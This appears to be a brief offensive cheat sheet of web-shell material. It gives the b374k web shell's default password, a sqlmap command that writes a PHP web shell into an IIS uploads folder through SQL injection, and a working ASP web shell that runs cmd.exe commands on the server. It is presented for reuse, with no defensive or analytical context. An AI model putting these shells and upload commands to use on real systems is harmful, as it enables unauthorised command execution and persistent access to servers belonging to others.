These web shells helped tons. They might help you as well.

### [b374k webshell password]
```
b374k
```

### [Uploading Webshell using sqlmap]
```
sqlmap -r file_request --file-write=/root/pwn/http/winterwolfshell.php --file-dest=/inetpub/wwwroot/uploads/winterwolfshell.php --batch
```

### [asp based webshell]
```
<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("win.com cmd.exe /c dir C:\test > C:\inetpub\results.txt",0,True)
%>
```
